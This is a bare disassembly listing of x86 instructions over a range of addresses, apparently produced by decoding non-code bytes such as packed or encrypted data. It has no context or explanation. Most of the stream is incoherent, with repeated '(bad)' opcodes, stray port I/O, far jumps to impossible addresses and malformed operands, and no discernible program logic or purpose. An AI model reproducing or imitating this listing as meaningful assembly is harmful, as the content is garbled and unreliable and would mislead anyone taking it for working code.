  4075a5:	mov    ah,BYTE PTR [ecx+esi*8]
  4075a8:	adc    DWORD PTR [edx],ecx
  4075aa:	arpl   WORD PTR [ecx+ebx*4+0x1a9efe01],bx
  4075b1:	retf   0x92cc
  4075b4:	out    dx,eax
  4075b5:	loopne 0x4075a4
  4075b7:	add    al,0x51
  4075ba:	mov    edi,0xd6b7d025
  4075bf:	test   BYTE PTR [ebp+0x2a8ee710],0x8b
  4075c6:	xor    esi,DWORD PTR [ebx]
  4075c8:	dec    edx
  4075c9:	call   FWORD PTR [ecx]
  4075cb:	add    esp,edi
  4075cd:	pop    edi
  4075ce:	jp     0x4075b9
  4075d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075d1:	stos   DWORD PTR es:[edi],eax
  4075d2:	rcr    BYTE PTR [ebx-0x4873b3d4],0x80
  4075d9:	aaa    
  4075da:	add    BYTE PTR [ebx],0x21
  4075dd:	(bad)  
  4075de:	cld    
  4075df:	jge    0x4075d0
  4075e1:	jnp    0x4075c2
  4075e3:	call   0xc003:0x5907dc4d
  4075ea:	xor    DWORD PTR [ebp+eiz*1+0x49],eax
  4075ee:	xlat   BYTE PTR ds:[ebx]
  4075ef:	push   0xfffffffd
  4075f1:	push   eax
  4075f2:	aad    0x78
  4075f4:	inc    ebx
  4075f5:	mov    WORD PTR [edi+0x29],ds
  4075f8:	mov    WORD PTR [esi],gs
  4075fa:	mov    ecx,0x368c737e
  4075ff:	fwait
  407600:	mov    esi,0x16e5074
  407605:	ret    0x2d7a
  407608:	mov    ebp,eax
  40760a:	mov    edx,0x122060f0
  40760f:	call   DWORD PTR [ecx-0x67dfebe0]
  407615:	xchg   esp,eax
  407616:	or     DWORD PTR [ebx-0x38273dbe],edx
  40761c:	add    al,0x64
  40761e:	xchg   BYTE PTR [eax+0x5272251a],dl
  407624:	xor    eax,0xd2ee9da1
  407629:	dec    esi
  40762a:	(bad)  
  40762b:	je     0x407687
  40762d:	xchg   DWORD PTR [ebx+edi*2],ecx
  407630:	mov    bh,0x18
  407632:	or     eax,0x737a0ce6
  407637:	jbe    0x4075ef
  407639:	pop    edx
  40763a:	in     al,dx
  40763b:	ins    BYTE PTR es:[edi],dx
  40763c:	neg    DWORD PTR [eax]
  40763e:	neg    bl
  407640:	ins    BYTE PTR es:[edi],dx
  407641:	ins    DWORD PTR es:[edi],dx
  407642:	outs   dx,DWORD PTR ds:[esi]
  407643:	mov    al,0xb5
  407645:	cmp    DWORD PTR [eax+esi*1+0x18],esp
  407649:	mov    dl,0x31
  40764b:	sbb    cl,dl
  40764d:	sbb    ebp,DWORD PTR [eax+edx*4+0x24]
  407651:	sub    eax,0x396ad5a
  407656:	pop    es
  407657:	outs   dx,DWORD PTR ds:[esi]
  407658:	es pop eax
  40765a:	rcr    BYTE PTR [eax],0x1f
  40765d:	mov    dl,0x14
  40765f:	xchg   edx,eax
  407660:	lds    esp,FWORD PTR [ebx+0x1544e8b9]
  407666:	into   
  407667:	cmp    al,0x82
  407669:	and    eax,0x556fb51c
  40766e:	fnstcw WORD PTR [ebx]
  407670:	in     al,dx
  407671:	push   ebx
  407672:	inc    edx
  407673:	or     BYTE PTR ds:0x718071b4,al
  407679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40767a:	add    DWORD PTR [eax],edx
  40767c:	loopne 0x4076be
  40767e:	bound  eax,QWORD PTR [edx]
  407680:	pop    esp
  407681:	add    DWORD PTR [esi-0x340d0342],ebp
  407687:	outs   dx,DWORD PTR ds:[esi]
  407688:	loope  0x40769c
  40768a:	mov    dl,0x2e
  40768c:	or     esp,DWORD PTR [ecx]
  40768e:	add    DWORD PTR cs:[edi],ebp
  407691:	add    edx,edi
  407693:	sub    esp,0x589e2789
  407699:	(bad)  
  40769a:	retf   
  40769b:	mov    eax,0xc0035947
  4076a0:	xor    DWORD PTR [ecx+edx*2],esp
  4076a3:	jmp    0xe3c4:0x3f75a94c
  4076aa:	add    ecx,DWORD PTR [ebx]
  4076ac:	adc    BYTE PTR [edx+0x60],al
  4076af:	mov    ecx,fs
  4076b1:	retf   0xdbd5
  4076b4:	push   0xd98f73b3
  4076b9:	adc    eax,0x42660771
  4076be:	loopne 0x4076df
  4076c0:	adc    BYTE PTR [eax],ah
  4076c2:	mov    ch,0xdb
  4076c4:	inc    esi
  4076c5:	loop   0x4076c8
  4076c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076c8:	out    0xc3,eax
  4076ca:	jnp    0x407656
  4076cc:	push   edx
  4076cd:	daa    
  4076ce:	int3   
  4076cf:	mov    ah,0x84
  4076d1:	mov    ecx,0x2adc8bf
  4076d6:	inc    esp
  4076d7:	dec    esi
  4076d8:	mov    ds:0x68c89472,al
  4076dd:	daa    
  4076de:	sti    
  4076df:	je     0x40773b
  4076e1:	jnp    0x4076d7
  4076e3:	pop    edx
  4076e4:	pop    es
  4076e5:	or     al,0x7a
  4076e7:	xlat   BYTE PTR ds:[ebx]
  4076e8:	sbb    esi,esi
  4076ea:	into   
  4076eb:	mov    bl,0xd1
  4076ed:	fwait
  4076ee:	mov    cl,0xb3
  4076f0:	sub    eax,ebx
  4076f2:	fisubr DWORD PTR [ebx+esi*1+0x1a]
  4076f6:	neg    cl
  4076f8:	fcomp  QWORD PTR [eax+esi*4]
  4076fb:	mov    bl,0xbd
  4076fd:	leave  
  4076fe:	jo     0x4076a3
  407700:	iret   
  407701:	push   0x3468c1b4
  407706:	inc    eax
  407707:	dec    edx
  407708:	mov    DWORD PTR [edx+0x9],edx
  40770b:	inc    edx
  40770c:	mov    ch,0x91
  40770e:	xor    al,BYTE PTR [ecx+0x48]
  407711:	adc    DWORD PTR [edx-0x73b5bdd7],0xc41815b1
  40771b:	dec    esi
  40771c:	enter  0x4f95,0x75
  407720:	pop    ss
  407721:	adc    BYTE PTR [eax-0x2b],dh
  407724:	div    BYTE PTR [esi+0xc050e4c]
  40772a:	and    DWORD PTR [ecx+0x15c9f6b5],0xe053100
  407734:	sub    DWORD PTR [ebx],0xeafabeaf
  40773a:	jns    0x407778
  40773c:	cmp    al,ah
  40773e:	jl     0x407752
  407740:	scas   eax,DWORD PTR es:[edi]
  407741:	jecxz  0x40771b
  407743:	les    ecx,FWORD PTR [eax+ebp*1]
  407746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407747:	xchg   esp,eax
  407748:	lds    esp,FWORD PTR [ebx-0x71]
  40774b:	cmp    eax,0xb0668eb6
  407750:	push   es
  407751:	and    BYTE PTR [ebx+0x49],0x91
  407755:	out    0x3f,eax
  407757:	and    eax,0x60ab6885
  40775c:	add    al,BYTE PTR [eax]
  40775e:	or     BYTE PTR [ecx-0x1b3675ae],al
  407764:	nop
  407765:	fstp   TBYTE PTR [ebx-0x70b551e7]
  40776b:	jb     0x40771c
  40776d:	sbb    eax,0x99b28257
  407772:	jmp    0x5:0xb1d2885a
  407779:	inc    edx
  40777a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40777b:	fldenv [ecx-0x6d4b5edc]
  407781:	sub    al,0x57
  407783:	sbb    al,0xe4
  407785:	(bad)  
  407786:	(bad)  
  407787:	jbe    0x4077be
  407789:	mov    BYTE PTR [edx],al
  40778b:	sub    DWORD PTR [ebx-0x5c],ecx
  40778e:	sub    BYTE PTR [ecx+0x272a4e62],dl
  407794:	and    al,0x6a
  407796:	dec    edx
  407797:	daa    
  407798:	sub    eax,0xfa4bb4e8
  40779d:	fstp   QWORD PTR [ebx+0x30aef46c]
  4077a3:	sbb    dl,BYTE PTR [esp+ecx*4-0x3ca4dafa]
  4077aa:	mov    WORD PTR [ebp+0x7bf430d],gs
  4077b0:	mov    ebp,0x6830628e
  4077b5:	mov    bl,0x39
  4077b7:	fisub  DWORD PTR [eax+0x1a30183f]
  4077bd:	ins    DWORD PTR es:[edi],dx
  4077be:	mov    cl,0xb1
  4077c0:	mov    cl,0x49
  4077c2:	xchg   edx,eax
  4077c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077c4:	dec    eax
  4077c5:	xchg   ebp,eax
  4077c6:	loopne 0x4077fa
  4077c8:	and    DWORD PTR ds:0x343ee7d6,eax
  4077ce:	add    DWORD PTR [edx-0x490e0f57],esp
  4077d4:	clc    
  4077d5:	not    DWORD PTR [ecx+0x0]
  4077d8:	jno    0x40782e
  4077da:	mov    ecx,0x80f5f623
  4077df:	push   ds
  4077e0:	jo     0x4077ec
  4077e2:	clc    
  4077e3:	jo     0x407788
  4077e5:	dec    eax
  4077e6:	mov    DWORD PTR [ebx],eax
  4077e8:	mov    BYTE PTR [ecx],bl
  4077ea:	mov    al,0x67
  4077ec:	lods   eax,DWORD PTR ds:[esi]
  4077ed:	mov    ebp,0x6f1bc6f5
  4077f2:	mov    WORD PTR [ebp-0x77bd78f0],es
  4077f8:	fild   DWORD PTR [edx-0x78]
  4077fb:	jge    0x407799
  4077fd:	lahf   
  4077fe:	loop   0x40782d
  407800:	sub    ebp,esp
  407802:	fwait
  407803:	sar    BYTE PTR [ecx-0x41],0x7d
  407807:	jb     0x4077f7
  407809:	fdivr  QWORD PTR [ecx]
  40780b:	ret    
  40780c:	lahf   
  40780d:	arpl   WORD PTR [ecx+0x3],bx
  407810:	shl    BYTE PTR [ecx],0x44
  407813:	sar    BYTE PTR [ebx-0x5c],0x94
  407817:	dec    eax
  407818:	lahf   
  407819:	(bad)  
  40781a:	sbb    edi,ebx
  40781c:	add    BYTE PTR [esi],cl
  40781e:	cmpxchg8b QWORD PTR [esi+eiz*2+0x12]
  407823:	lods   al,BYTE PTR ds:[esi]
  407824:	jp     0x40783d
  407826:	repz sub ecx,DWORD PTR ds:0xc7040958
  40782d:	popf   
  40782e:	aaa    
  40782f:	xor    edx,DWORD PTR [eax]
  407831:	and    BYTE PTR [edi+ebx*8-0x1ab63412],dh
  407838:	mov    bh,0x3b
  40783a:	aas    
  40783b:	test   BYTE PTR [ecx+0x3722ac0a],dh
  407841:	adc    dh,BYTE PTR [esp+eiz*2+0x2870133f]
  407848:	rcr    BYTE PTR [edx],0xef
  40784b:	or     BYTE PTR [esp+ecx*2+0x42],dh
  40784f:	leave  
  407850:	sub    DWORD PTR [ecx-0x395c5bc6],ecx
  407856:	je     0x4078b2
  407858:	sti    
  407859:	mov    WORD PTR [edx-0x49],?
  40785c:	fcomp  st(2)
  40785e:	mov    eax,0x12e0d6c9
  407863:	fwait
  407864:	sbb    ebx,DWORD PTR [edx+0x27042733]
  40786a:	dec    edi
  40786b:	je     0x407886
  40786d:	outs   dx,BYTE PTR ds:[esi]
  40786e:	je     0x407849
  407870:	ficomp WORD PTR [edx]
  407872:	xor    bl,BYTE PTR [esi+esi*8]
  407875:	jmp    0x64d33f0
  40787a:	add    edi,edx
  40787c:	std    
  40787d:	and    DWORD PTR [edx+0x25],edx
  407880:	dec    eax
  407881:	test   eax,0x21049248
  407886:	pop    esp
  407887:	fiadd  WORD PTR [ebx+0x45130631]
  40788d:	sub    ebp,esi
  40788f:	(bad)  
  407890:	and    bl,BYTE PTR [edx-0x3bfea91b]
  407896:	xor    DWORD PTR [ebp-0x6d],ecx
  407899:	inc    esp
  40789a:	or     BYTE PTR [ecx],dh
  40789c:	les    esi,FWORD PTR [ecx]
  40789e:	mov    bl,dl
  4078a0:	inc    edi
  4078a1:	pop    ebp
  4078a2:	mov    edi,0x9cb8e1
  4078a7:	scas   eax,DWORD PTR es:[edi]
  4078a8:	pop    esp
  4078a9:	mov    ecx,0x9c2de572
  4078ae:	jecxz  0x4078a2
  4078b0:	stos   BYTE PTR es:[edi],al
  4078b1:	adc    dl,ah
  4078b3:	sti    
  4078b4:	ficomp WORD PTR [edi]
  4078b6:	jno    0x407911
  4078b8:	or     BYTE PTR [ecx-0x361b0d81],dh
  4078be:	pop    ds
  4078bf:	sti    
  4078c0:	mov    al,0xe7
  4078c2:	sbb    al,BYTE PTR [eax]
  4078c4:	mov    fs,WORD PTR [ecx]
  4078c6:	push   edx
  4078c7:	test   eax,0xe5a7c107
  4078cc:	add    cl,BYTE PTR [eax]
  4078ce:	add    DWORD PTR ds:0x49800054,0xdf95eb89
  4078d8:	imul   esp,DWORD PTR [edi-0xe7be7ef],0xe7bb7be7
  4078e2:	or     dl,0xbc
  4078e5:	or     bl,bl
  4078e7:	test   al,dh
  4078e9:	or     al,0xc2
  4078eb:	sti    
  4078ec:	pop    ds
  4078ed:	lods   al,BYTE PTR ds:[esi]
  4078ee:	add    cl,dl
  4078f0:	add    dl,cl
  4078f2:	add    DWORD PTR [edx+ebx*1],esp
  4078f5:	add    DWORD PTR [esi],0x9fd92d32
  4078fb:	or     DWORD PTR [esi-0x4729791b],ebp
  407901:	mov    al,ds:0xe8d9ced7
  407906:	pop    ss
  407907:	in     al,dx
  407908:	fcomp  QWORD PTR [edx-0x378f45cf]
  40790e:	inc    esi
  40790f:	ja     0x407953
  407911:	mov    edi,0x3bc0c073
  407916:	sub    al,0x3b
  407918:	jmp    0x8d1d7f42
  40791d:	lea    eax,[ecx+0x184ddfa0]
  407923:	push   cs
  407924:	sti    
  407925:	or     al,0x7a
  407927:	sbb    eax,0x830ebd7a
  40792c:	inc    BYTE PTR [eax+0x2108e18d]
  407932:	adc    eax,0x5448492a
  407937:	adc    BYTE PTR [eax-0x4a581e36],0x18
  40793e:	mov    ebx,0x58a3e050
  407943:	inc    esp
  407944:	in     eax,dx
  407945:	leave  
  407946:	mov    ?,WORD PTR [eax]
  407948:	sbb    eax,0xc4626b8e
  40794d:	adc    ch,BYTE PTR [esi+0x42918c6d]
  407953:	mov    BYTE PTR [esi],bh
  407955:	rol    bh,1
  407957:	mov    cl,0x89
  407959:	lahf   
  40795a:	imul   ebx,DWORD PTR [ebx+esi*1-0x3f9bbde9],0xde6f375b
  407965:	jl     0x407972
  407967:	bound  ebx,QWORD PTR [si+0x5297]
  40796c:	mov    esi,0x8021c1ee
  407971:	lds    edi,FWORD PTR [eax+edi*1+0x1c]
  407975:	dec    al
  407977:	fwait
  407978:	sbb    DWORD PTR [ebx+0x0],ebp
  40797b:	mov    eax,0xcfddf947
  407980:	jge    0x4079d0
  407982:	sbb    BYTE PTR [ebx-0x22],ah
  407985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407987:	je     0x4079d2
  407989:	inc    eax
  40798a:	fisub  WORD PTR [ebx+0x521012e]
  407990:	jnp    0x407a0d
  407992:	pop    es
  407993:	mov    WORD PTR [edi],cs
  407995:	adc    ebp,esi
  407997:	lods   eax,DWORD PTR ds:[esi]
  407998:	outs   dx,DWORD PTR ds:[esi]
  407999:	cmp    eax,DWORD PTR [edx-0x54]
  40799c:	out    dx,eax
  40799d:	rol    ebx,0xff
  4079a0:	ja     0x4079ff
  4079a2:	mov    WORD PTR [edi],es
  4079a4:	add    ecx,DWORD PTR ds:0xcace748
  4079aa:	pop    ss
  4079ab:	push   ss
  4079ac:	add    ah,BYTE PTR [ecx]
  4079ae:	inc    ecx
  4079af:	leave  
  4079b0:	xchg   esp,eax
  4079b1:	push   esi
  4079b2:	mov    ebx,0xd11dd245
  4079b7:	out    dx,al
  4079b8:	or     edi,DWORD PTR [edx]
  4079ba:	and    eax,DWORD PTR [ebp-0x45]
  4079bd:	shrd   DWORD PTR [esi],ebx,cl
  4079c0:	test   al,0xb6
  4079c2:	and    eax,0x25052597
  4079c7:	sti    
  4079c8:	mov    edx,0x8278c6e0
  4079cd:	sbb    al,0x8f
  4079cf:	ror    esp,0x10
  4079d2:	jbe    0x407a20
  4079d4:	dec    ebx
  4079d5:	mov    cs,WORD PTR [ecx+0x55]
  4079d8:	dec    esi
  4079d9:	cmp    edi,DWORD PTR [ecx-0x728a44b3]
  4079df:	jle    0x4079f8
  4079e1:	cli    
  4079e2:	mov    ebp,0x8751cd84
  4079e7:	inc    ecx
  4079e8:	pop    edi
  4079e9:	ror    DWORD PTR [esi+0x2d],1
  4079ec:	lods   eax,DWORD PTR ds:[esi]
  4079ed:	xchg   esi,eax
  4079ee:	mov    ds:0xd2b452dd,al
  4079f3:	test   BYTE PTR [ecx*2+0x6d33985c],ah
  4079fa:	cmp    DWORD PTR [esi],edx
  4079fc:	mov    eax,ds:0x569a5412
  407a01:	dec    esp
  407a02:	mov    ds:0x9b5459f9,al
  407a07:	push   ebx
  407a08:	out    dx,al
  407a09:	cwde   
  407a0a:	sbb    DWORD PTR [edi+esi*8],esi
  407a0d:	xor    eax,0xb1df87bf
  407a12:	xor    al,0x81
  407a14:	and    al,0xde
  407a16:	push   ds
  407a17:	or     DWORD PTR [ebx-0x35],0x3e02db5a
  407a1e:	or     BYTE PTR [eax+esi*1+0x6],bh
  407a22:	sub    eax,0xb1c58421
  407a27:	xchg   DWORD PTR [ebx-0x40],ebx
  407a2a:	lds    eax,FWORD PTR [ebx+0x528b8383]
  407a30:	retf   0xc00b
  407a33:	adc    eax,0x1c6e6f
  407a38:	mov    ebx,0x9038e4de
  407a3d:	push   edx
  407a3e:	out    dx,al
  407a3f:	jecxz  0x407a03
  407a41:	sahf   
  407a42:	pop    ecx
  407a43:	stos   DWORD PTR es:[edi],eax
  407a44:	aad    0xfa
  407a46:	mov    eax,ds:0xd72e38
  407a4b:	jo     0x4079dc
  407a4d:	push   edx
  407a4e:	push   0xffffffdd
  407a50:	dec    ecx
  407a51:	xchg   esp,eax
  407a52:	jp     0x407a1e
  407a54:	pop    edx
  407a55:	mov    ecx,DWORD PTR [edx+0x12]
  407a58:	dec    esp
  407a59:	pop    ecx
  407a5a:	mov    edx,0xd14d3fde
  407a5f:	pop    edx
  407a60:	jae    0x407a57
  407a62:	fisubr DWORD PTR ds:0x97d0d966
  407a68:	mov    esi,0xcaf01817
  407a6d:	lods   ax,WORD PTR ds:[esi]
  407a6f:	push   edi
  407a70:	mov    esp,0xd754901f
  407a75:	mov    eax,DWORD PTR [esi+0x1d]
  407a78:	lods   al,BYTE PTR ds:[esi]
  407a79:	add    al,0x1c
  407a7b:	aaa    
  407a7c:	ds inc ecx
  407a7e:	dec    ecx
  407a7f:	inc    ebx
  407a80:	call   0x86d6:0xcd6dba08
  407a87:	loop   0x407a0a
  407a89:	xchg   ebx,eax
  407a8a:	xchg   esi,eax
  407a8b:	adc    ebx,DWORD PTR [ebx-0x7e]
  407a8e:	int    0x21
  407a90:	ins    BYTE PTR es:[edi],dx
  407a91:	ins    BYTE PTR es:[edi],dx
  407a92:	or     dl,dl
  407a94:	and    al,0xc5
  407a96:	xchg   edx,eax
  407a97:	mov    ds:0x1ca29775,al
  407a9c:	push   edx
  407a9d:	call   0xf25b0f55
  407aa2:	adc    cl,BYTE PTR [edx-0x4cf2f5ee]
  407aa8:	adc    cl,dl
  407aaa:	mov    ds:0x9415ecc4,al
  407aaf:	aaa    
  407ab0:	dec    ebx
  407ab1:	dec    esp
  407ab2:	cdq    
  407ab3:	and    ebp,ebp
  407ab5:	cwde   
  407ab6:	push   esp
  407ab7:	into   
  407ab8:	dec    eax
  407ab9:	aad    0x9c
  407abb:	outs   dx,BYTE PTR ds:[esi]
  407abc:	mov    edx,0x27dd374f
  407ac1:	xchg   ebp,eax
  407ac2:	jae    0x407afe
  407ac4:	jmp    0x6772d15d
  407ac9:	rcl    BYTE PTR [ebx+0x6c],1
  407acc:	or     al,0x5a
  407ace:	or     al,0xfa
  407ad0:	pop    ebp
  407ad1:	jp     0x407ab0
  407ad3:	cs in  eax,dx
  407ad5:	dec    esi
  407ad6:	fwait
  407ad7:	shl    DWORD PTR [eax+0x48],0x7f
  407adb:	xor    BYTE PTR [eax],ah
  407add:	dec    ecx
  407ade:	sbb    al,0x28
  407ae0:	and    al,0x49
  407ae2:	adc    BYTE PTR [edx+0x9],0xd6
  407ae6:	sbb    dh,BYTE PTR [esi+esi*1-0x47fa4db9]
  407aed:	jae    0x407a93
  407aef:	and    bh,ah
  407af1:	setns  BYTE PTR [eax-0x876dfb3]
  407af8:	sbb    eax,0x2e308be5
  407afd:	in     eax,0x5b
  407aff:	dec    eax
  407b00:	sub    DWORD PTR [ebx-0x4f5e1dd1],eax
  407b06:	pop    ebp
  407b07:	cli    
  407b08:	adc    al,0xf0
  407b0a:	call   0xe148d5eb
  407b0f:	jecxz  0x407acf
  407b11:	dec    esp
  407b12:	or     ebx,0x115c5145
  407b18:	inc    edx
  407b19:	mov    esp,0x97146384
  407b1e:	jl     0x407ad6
  407b20:	in     eax,0xcb
  407b22:	pop    ss
  407b23:	cs pop esp
  407b25:	cmp    BYTE PTR [eax-0x1c],bh
  407b28:	xchg   ecx,eax
  407b29:	inc    edi
  407b2a:	fidiv  WORD PTR [ebp+0x6b9ed1]
  407b30:	mov    eax,0xdbb56947
  407b35:	daa    
  407b36:	xor    BYTE PTR [esi+0x47],ah
  407b39:	js     0x407ae2
  407b3b:	lahf   
  407b3c:	cmc    
  407b3d:	jns    0x407b3b
  407b3f:	and    edi,esp
  407b41:	jmp    esi
  407b43:	int    0x5d
  407b45:	(bad)
  407b4b:	sbb    bh,BYTE PTR gs:[edi-0x59]
  407b4f:	fdivr  QWORD PTR [ebx+0x6b8d29fb]
  407b55:	push   esp
  407b56:	retf   0x36fd
  407b59:	scas   eax,DWORD PTR es:[edi]
  407b5a:	out    dx,eax
  407b5b:	xchg   BYTE PTR [eax],dl
  407b5d:	nop
  407b5e:	sub    BYTE PTR [ecx-0x59],al
  407b61:	add    eax,ebx
  407b63:	or     eax,0x9f74d9d8
  407b68:	lods   eax,DWORD PTR ds:[esi]
  407b69:	adc    DWORD PTR [esp+ebx*4+0x6b0c301f],esi
  407b70:	mov    al,ds:0x42cda034
  407b75:	stc    
  407b76:	mov    ch,0x71
  407b78:	push   ebx
  407b7a:	xor    ah,BYTE PTR [ecx+0x40da09d0]
  407b80:	pop    esi
  407b81:	inc    eax
  407b82:	pop    esi
  407b83:	out    dx,al
  407b84:	mov    eax,0x141c0532
  407b89:	mov    al,0x67
  407b8b:	dec    edx
  407b8c:	dec    esp
  407b8d:	test   eax,0x8a19f391
  407b92:	or     DWORD PTR [edx+0x77],ebp
  407b95:	and    dl,0x90
  407b98:	xchg   esi,eax
  407b99:	mov    eax,0xd21d4745
  407b9e:	dec    esi
  407b9f:	daa    
  407ba0:	hlt    
  407ba1:	pop    edx
  407ba2:	xchg   edi,eax
  407ba3:	jmp    0x8f1db54c
  407ba8:	mov    al,ds:0xe194bdf
  407bad:	cli    
  407bae:	je     0x407b6a
  407bb0:	ins    DWORD PTR es:[edi],dx
  407bb1:	cmp    ch,ch
  407bb3:	push   cs
  407bb4:	sbb    eax,ebx
  407bb6:	and    ebp,ebx
  407bb8:	outs   dx,BYTE PTR ds:[esi]
  407bb9:	lahf   
  407bba:	push   esi
  407bbb:	retf   
  407bbc:	mov    cl,0x7
  407bbe:	xchg   ebp,eax
  407bbf:	and    al,0x28
  407bc1:	jmp    0x3786adc2
  407bc6:	push   es
  407bc7:	push   0xc2b5b5c5
  407bcc:	scas   eax,DWORD PTR es:[edi]
  407bcd:	mov    al,0x54
  407bcf:	add    eax,0x32777d8d
  407bd4:	cmp    DWORD PTR [esi-0x63],edx
  407bd7:	ret    
  407bd8:	inc    esp
  407bd9:	add    edi,DWORD PTR [ecx-0x529a8684]
  407bdf:	push   ebp
  407be0:	(bad)  
  407be1:	cwde   
  407be2:	mov    dh,0x94
  407be4:	jb     0x407c46
  407be6:	lods   eax,DWORD PTR ds:[esi]
  407be7:	cmp    eax,0xf014fc05
  407bec:	mov    esp,ecx
  407bee:	pop    edx
  407bef:	inc    edx
  407bf0:	or     BYTE PTR [ebx],al
  407bf2:	dec    esp
  407bf3:	(bad)  
  407bf4:	jecxz  0x407be7
  407bf6:	in     eax,0xaf
  407bf8:	jge    0x407be7
  407bfa:	imul   edi,DWORD PTR [edi-0x14a9521],0xffffffd9
  407c01:	ror    DWORD PTR [edi+0x3f],cl
  407c04:	jge    0x407be7
  407c06:	js     0x407c37
  407c08:	out    dx,eax
  407c09:	out    dx,al
  407c0a:	mov    dl,0x6
  407c0c:	cmp    BYTE PTR [ebx+0x14],0xa3
  407c10:	cmc    
  407c11:	jnp    0x407bb7
  407c13:	adc    ch,ch
  407c15:	and    al,0x49
  407c17:	nop
  407c18:	push   edx
  407c19:	and    ah,BYTE PTR [ebp-0x6d74a4bc]
  407c1f:	adc    ch,BYTE PTR [esi+eiz*8+0x4a038dfa]
  407c26:	jge    0x407bc2
  407c28:	stos   BYTE PTR es:[edi],al
  407c29:	imul   DWORD PTR [edi-0xa]
  407c2c:	stos   BYTE PTR es:[edi],al
  407c2d:	out    dx,eax
  407c2e:	lods   eax,DWORD PTR ss:[esi]
  407c30:	mov    bh,0x81
  407c32:	into   
  407c33:	(bad)  
  407c34:	xlat   BYTE PTR ds:[ebx]
  407c35:	mov    edi,0xd254177f
  407c3a:	sub    DWORD PTR [ebx-0x41],edi
  407c3d:	add    eax,ebx
  407c3f:	add    DWORD PTR [ebp+ecx*1+0x61],ebp
  407c43:	addr16 add al,0xed
  407c46:	ss sub ch,ah
  407c49:	cs addr16 xor al,0x68
  407c4d:	or     eax,esi
  407c4f:	cmp    al,BYTE PTR [eax]
  407c51:	rcr    BYTE PTR [esi],1
  407c53:	or     al,0xb4
  407c55:	jbe    0x407c77
  407c57:	push   eax
  407c58:	cli    
  407c59:	std    
  407c5a:	add    DWORD PTR [edx+ecx*2],ebx
  407c5d:	sbb    eax,0x4eb401c0
  407c62:	sub    BYTE PTR [edx+eax*2+0x56],cl
  407c66:	mov    ah,0x29
  407c68:	cmc    
  407c69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c6a:	fistp  DWORD PTR [edi-0x3e]
  407c6d:	popa   
  407c6e:	or     DWORD PTR [ebx-0x5d],esp
  407c71:	mov    cl,0xba
  407c73:	test   cl,ch
  407c75:	pushf  
  407c76:	xchg   esp,eax
  407c77:	inc    ebx
  407c78:	aam    0xc1
  407c7a:	add    al,0xc5
  407c7c:	xchg   esp,eax
  407c7d:	mov    dh,0xb8
  407c7f:	inc    ebp
  407c80:	dec    ebx
  407c81:	sbb    al,0xd2
  407c83:	dec    esi
  407c84:	imul   cl
  407c86:	mov    ch,0xae
  407c88:	ror    DWORD PTR [edx+0x32],cl
  407c8b:	fisubr DWORD PTR [ecx]
  407c8d:	or     al,0x7a
  407c8f:	ins    DWORD PTR es:[edi],dx
  407c90:	xchg   BYTE PTR [ebx],bl
  407c92:	cmp    eax,0x6e949d3a
  407c97:	mov    bh,0xcd
  407c99:	jo     0x407cfe
  407c9b:	inc    eax
  407c9c:	mov    bh,0xdb
  407c9e:	mov    ds:0xb4b8eedd,eax
  407ca3:	push   0x22421121
  407ca8:	test   esp,esi
  407caa:	mov    bl,0x39
  407cac:	leave  
  407cad:	stos   BYTE PTR es:[edi],al
  407cae:	xchg   edi,eax
  407caf:	or     al,BYTE PTR ds:[edx+eiz*2]
  407cb3:	gs (bad) 
  407cb6:	frstor [edx+eax*1+0x61]
  407cba:	pop    edi
  407cbb:	sbb    BYTE PTR [edx+0x4efe3cdd],bh
  407cc1:	mov    esi,0x23001589
  407cc6:	mov    ch,0xd6
  407cc8:	sbb    esp,edi
  407cca:	iret   
  407ccb:	lahf   
  407ccc:	jg     0x407d40
  407cce:	ja     0x407d47
  407cd0:	test   ecx,0xea7a9ea7
  407cd6:	addr16 mov edi,0xfc6f8df1
  407cdc:	(bad)  
  407cdd:	dec    edi
  407cde:	aas    
  407cdf:	std    
  407ce0:	hlt    
  407ce1:	or     esi,edi
  407ce3:	jmp    0xab7f7d
  407ce8:	mov    eax,0x7f5a3167
  407ced:	inc    eax
  407cee:	dec    eax
  407cef:	sub    DWORD PTR [ebp+0x4a55a94f],esp
  407cf5:	mov    ecx,0xfb14ad97
  407cfa:	sti    
  407cfb:	mov    bh,0xb9
  407cfd:	mov    ebp,0x8ecac927
  407d02:	add    BYTE PTR [bp+di],ch
  407d05:	pop    es
  407d06:	aad    0xdc
  407d08:	scas   eax,DWORD PTR es:[edi]
  407d09:	cmp    esp,DWORD PTR [ecx-0x3f]
  407d0c:	sub    al,ah
  407d0e:	frstor [ebx+0x15]
  407d11:	push   es
  407d12:	mov    ebx,DWORD PTR [ebx]
  407d14:	mov    cl,0x18
  407d16:	push   es
  407d17:	sub    ecx,DWORD PTR [ebx+0x1]
  407d1a:	imul   ecx,DWORD PTR [edx],0xfa0c36dd
  407d20:	xor    BYTE PTR [edx],bl
  407d22:	cmp    al,BYTE PTR [eax+0x50]
  407d25:	push   0xffffff91
  407d27:	sbb    BYTE PTR [ecx-0x44],ch
  407d2a:	inc    ebp
  407d2b:	popa   
  407d2c:	or     al,0x94
  407d2e:	(bad)  
  407d2f:	jnp    0x407d31
  407d31:	add    ah,BYTE PTR [ebx-0x24]
  407d34:	(bad)  
  407d35:	shr    BYTE PTR [ebx],cl
  407d37:	mov    edi,0x94318e31
  407d3c:	jp     0x407cff
  407d3e:	push   ds
  407d3f:	ret    0xd2be
  407d42:	add    BYTE PTR cs:[edx+0x28d28a34],ah
  407d49:	repnz mov ds:0x5547a14d,al
  407d4f:	cdq    
  407d50:	mov    ds:0xe58d284,al
  407d55:	(bad)  
  407d56:	out    0xa6,al
  407d58:	sub    DWORD PTR [eax],edx
  407d5a:	xchg   BYTE PTR gs:[eax],ch
  407d5d:	xor    cl,ah
  407d5f:	cmp    BYTE PTR [ebx+0x5c],al
  407d62:	popf   
  407d63:	and    cl,BYTE PTR [esi+eax*2+0x22]
  407d67:	or     bh,BYTE PTR [edx-0x17]
  407d6a:	pushf  
  407d6b:	outs   dx,BYTE PTR ds:[esi]
  407d6c:	jp     0x407cf1
  407d6e:	jbe    0x407dc2
